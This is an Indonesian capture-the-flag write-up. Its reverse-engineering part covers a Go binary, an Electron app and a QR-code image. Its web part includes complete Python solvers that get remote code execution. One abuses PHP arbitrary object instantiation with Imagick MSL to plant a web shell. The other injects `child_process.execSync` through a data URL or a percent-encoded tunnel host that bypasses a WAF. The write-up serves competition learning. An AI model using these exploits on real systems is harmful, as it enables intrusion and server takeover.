source code: [src](https://drive.google.com/drive/folders/1E9JEXgwCEuTXgw1IkrYl-oH5C-3W1w-s?usp=sharing)
# Reverse Engineering
---
## Madhang
Diberikan sebuah file GO executable (ELF x64) 

![](Pasted%20image%2020221222211921.png)

Langsung kita analisa menggunakan IDA Pro

Sedikit snippet pada bagian main dari exec ini, pada intinya kita harus memberi input pada argumen pertama ketika menjalankan exec ini, contohnya:

```sh
./madhang <string_nya>
```

![](Pasted%20image%2020221222211953.png)

Karena tidak terdapat fungsi yang mengandung unsur flag, maka saya lanjutkan analisa ke fungsi main_madhang .

Bisa dilihat disini bahwa flag akan didecrypt dan dicompare dengan input kita yang tadi kita masukkan lewat argumen.

![](Pasted%20image%2020221222212013.png)

Pada intinya, kalo misalkan hasil xor input byte ke-i sama dengan flag byte ke-i. maka count akan ditambahkan dengan satu. yang pada akhirnya count akan dicompare dengan length flag yang asli untuk memastikan bahwa flag yang kita masukkan benar. Solusinya cukup kita langsung decrypt saja flagnya dengan xor key 0x7f .

Kita decrypt menggunakan cyberchef dan dapatlah flagnya:

```
CJ2022{T4ndu12@ne_sUm1l!r_Pu0000LLL}
```

![](Pasted%20image%2020221222212045.png)

## Aplikasi Apa tuh ?

Diberikan sebuah aplikasi code editor, setelah dianalisa lebih lanjut ternyata aplikasi ini menggunakan electron sebagai framework utamanya.

Disini karena saya sudah pernah melakukan reversing pada aplikasi electron, maka disini saya tau bahwa hal pertama yang perlu kita cek ketika melakukan reversing pada aplikasi electron adalah melakukan unpacking pada file app.asar
Setelah kita unpack dengan command:

```sh
npx asar extract app.asar destfolder
```

Berikut file file yang tersedia setelah diunpack:

![](Pasted%20image%2020221222212131.png)

Setelah mencoba menganalisa pada main.js, tidak ada flagnya.

namun terdapat 1 folder yang menarik yaitu folder screenshot, dan benar saja flagnya terdapat pada file difolder tersebut

![](Pasted%20image%2020221222212154.png)

## Kui R Code?

Diberikan sebuah file gambar QR Code.

Setelah dicek, ternyata hasil decode dari QR Codenya merupakan dalam bentuk biner.

![](Pasted%20image%2020221222212232.png)

Namun ternyata flagnya tidak ada disini.

![](Pasted%20image%2020221222212243.png)

Setelah di cek menggunakan exiftool, stegsolver, zsteg tidak terdapat flag tersembunyi. Sampai satu saat saya melihat bahwa qr code dipotong ketika kita mengkakses bit red plane 0.

![](Pasted%20image%2020221222212315.png)

gambar pun saya coba crop agar kita bisa melakukan decode pada bagian dalam gambar tersebut.Benar saja, flagnya terdapat pada qr code yang telah di crop.

CJ2022{WOng_j00wo_oJo_il4n9_J0wO_N3}

# web
---
## PT Akasha Bijak Sentosa

Pada challenge kita diberikan attachment dan juga url.
Pada attachment ./apps/route.php kita menemukan code dibahwa, dimana kode ini bisa kita gunakan untuk memanggil arbitary php class.

```python
...snip...
if ($hasModule && $hasAction) {
    $module = $_GET['module'];
    $action = $_GET['action'];

    try {
        new $module($action);
    } catch (Exception $e) {
        echo "Terjadi Kesalahan";
    }
...snip...
```

Dari situ kita mencoba mencari artikel untuk mengeksploitasi vulnerability ini, berikut artikel yang kami gunakan sebagai reversensi https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/.

Merajuk pada artikel tersebut, kita bisa menggunakan class Imagick pada php. Dimana class ini dapat mengeksekusi file mls sehingga nantinya kita bisa mendapatkan arbitary file write dan mengupload shell ke server korban.

Tapi pertama-tama kita harus bisa mengupload file ke server. Di sini kita menggunakan fungsi send() pada class Contact() untuk mengupload file ke server:

```php
class Contact
{
    ...snip...
    function send()
    {
        $hasName = isset($_POST['name']);
        $hasBody = isset($_POST['body']);
        if ($hasName && $hasBody) {
            $body = $_POST['body'];

            $dirname = "/tmp/" . md5($_POST['name']) . time();
            if (!is_dir($dirname)) {
                mkdir($dirname);
            }
            
            $filename = md5(rand(100000000000, 999999999999)) . ".txt";

            file_put_contents($dirname . "/" . $filename, $body);

            echo "Berhasil Mengirimkan Pesan";
        } else {
            echo "Terjadi Kesalahan";
        }
    }
...snip...
```

Karna kita perlu mengeksekusi file mls kita perlu tau path file tersebut. Jadi untuk itu kita perlu mendapatkan $dirname yang dihasilkan dari md5 nama, dan time().

Untuk md5 nama kita hanya perlu membuat hash md5 dari nama yang kita inputkan, untuk time() kita  bisa menggunakan response Date yang diberikan server.

![](Pasted%20image%2020221222214414.png)

Setelah semua data yang diperlukan terkumpul, kita bisa langsung mengeksploitasi server.
berikut solver yang saya gunakan untuk mendapatkan rce pada challenge ini.

```python
import requests
from os import urandom
from binascii import b2a_hex
from hashlib import md5
from subprocess import check_output
from readline import redisplay

URL = "https://akasha.hackthesystem.pro/"


def execute_msl(hash, time_stamp, url=URL):
    time = time_stamp
    print(f"[+] folder name: {hash}{time}")
    res = requests.get(
        f"{url}/index.php?module=Imagick&action=vid:msl:/tmp/{hash}{time}/*.txt")
    if "Terjadi Kesalahan" in res.text:
        return False
    return True


def get_timestamp(date: str):
    time = date.split()[-2].split(':')
    day = 21
    month = 12
    year = 2022
    hour = time[0]
    minute = time[1]
    second = time[2]
    time_stamp = check_output(
        f'php -r "echo mktime({hour}, {minute}, {second}, {month}, {day}, {year});"', shell=True)
    return time_stamp


def upload_msl(message, url=URL):
    rand_name = b2a_hex(urandom(10))
    print("[+] rand name: "+rand_name.decode())
    res = requests.post(f"{url}/index.php?module=Contact&action=send", data={
        "name": rand_name.decode(),
        "body": message,
    })
    print("[+] server: "+res.text)
    time_stamp = get_timestamp(res.headers['Date']).decode()
    hash = b2a_hex(md5(rand_name).digest()).decode()
    print("[+] time stamp: "+time_stamp)
    return (hash, time_stamp)

def pseudo_shell(filename, url=URL):
    while (True):
        cmd = input("$ ")
        redisplay()
        res = requests.get(f"{url}uploads/{filename}", params={"a":cmd})
        print(res.text)

if __name__ == "__main__":
    filename = "s.php"
    b = upload_msl(f"""
<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="caption:&lt;?php @system(@$_REQUEST['a']); ?&gt;" />
 <write filename="info:/var/www/html/public/uploads/{filename}" />
</image>
    """.strip())
    a = execute_msl(*b)
    if not a:
        print("[x] exploit failure!")
    print("[+] upload shell success!")
    pseudo_shell(filename)
```

## fetcheval

![](Pasted%20image%2020221222214636.png)

untuk solusi pertama kita bisa menggunakan `data:localhost/html,<div id='eval'>Eval</div>` untuk mendapatkan rce
solver:

```python
import requests
import re
from html import unescape
from readline import redisplay

URL = "https://fetcheval.hackthesystem.pro/"


def req(x, url=URL):
    res = requests.post(url, data={
        "url": x,
    })
    return res.text


def parse_output(x):
    x = re.search(r"(?<=textarea disabled>).*?(?=</textarea>)", x, re.DOTALL)
    x = x.group(0)
    x = unescape(x)
    return x


def pseudo_shell(x: str):
    x = x.replace("'", "\\'")
    res = req(f"""data:localhost/html,
<div id='eval'>
    require('child_process').execSync('{x}')
</div>""")
    txt = parse_output(res)
    return txt
    
if __name__ == "__main__":
    while (True):
        cmd = input("$ ")
        redisplay()
        txt = pseudo_shell(cmd)
        print(txt)
```

cara kedua adalah dengan membuat domain sendiri, disini saya memakai expose https://expose.dev/ untuk membuat subdomain yang diawali dengan localhost

Domain saya yang awalnya seperti ini.

```
http://localhost.eus-1.sharedwithexpose.com
```

Kita rubah titiknya menjadi url encoded.

```
http://localhost%2eus-1.sharedwithexpose.com
```

Berikut solver yang saya gunakan.

```python
import threading
import requests
import re
from html import unescape
from readline import redisplay

from http.server import SimpleHTTPRequestHandler
import socketserver
from pwn import log, context
from http import HTTPStatus

context.log_level = "INFO"
URL = "https://fetcheval.hackthesystem.pro/"

def make_server(text_html):
    class Handler(SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_html(text_html)
            self.end_headers()

        def send_html(self, string):
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', str(len(string)))
            self.send_header('Last-Modified', self.date_time_string())
            self.end_headers()
            self.wfile.write(string.encode())
    return Handler

def thread(fn):
    def run(*k, **kw):
        t = threading.Thread(target=fn, args=k, kwargs=kw)
        t.start()
        return t
    return run

@thread
def serve(host, port, text):
    address = (host, port)
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(address, make_server(text)) as httpd:
        log.info(f"serve @ http://localhost:{address[1]}")
        httpd.handle_request()

def req(x, url=URL):
    res = requests.post(url, data={
        "url": x,
    })
    return res.text


def parse_output(x):
    x = re.search(r"(?<=textarea disabled>).*?(?=</textarea>)", x, re.DOTALL)
    x = x.group(0)
    x = unescape(x)
    return x

def craft_payload(x: str):
    x = x.replace("'", "\\'")
    payload = f"""
<div id='eval'>
    require('child_process').execSync('{x}')
</div>
    """.strip()
    return payload

if __name__ == "__main__":
    address = ("localhost", 4444)
    domain_url = "http://localhost%2eus-1.sharedwithexpose.com"
    while (True):
        cmd = input("$ ").strip()
        redisplay()
        payload = craft_payload(cmd)
        serve(*address, payload)
        res = req(domain_url)
        txt = parse_output(res)
        print(txt)
```

Kenapa kita bisa menggunakan percent encoding untuk membypass waf ini?
jawabannya ada pada package "url" dan juga fetch pada nodejs
pada package bawaan node js yaitu "url" kita akan menemukan hasil ini jika kita menambahkan persen di dalam url:

![](Pasted%20image%2020221222215806.png)

Dia akan mengganggap url setelah persen sebagai path, sehingga saat kita memanggil objek .host kita akan mendapatkan "localhost" dimana ini akan membypass waf dari server tersebut.

Untuk fetch dia memparse url encoded string yang ada di url kita, sehingga saat kita membuat url semisal:

```
http://localhost%2eap-1.sharedwithexpose.com
```

akan di parse oleh fetch dan setelah itu membuat request ke url berikut

```
http://localhost.ap-1.sharedwithexpose.com
```

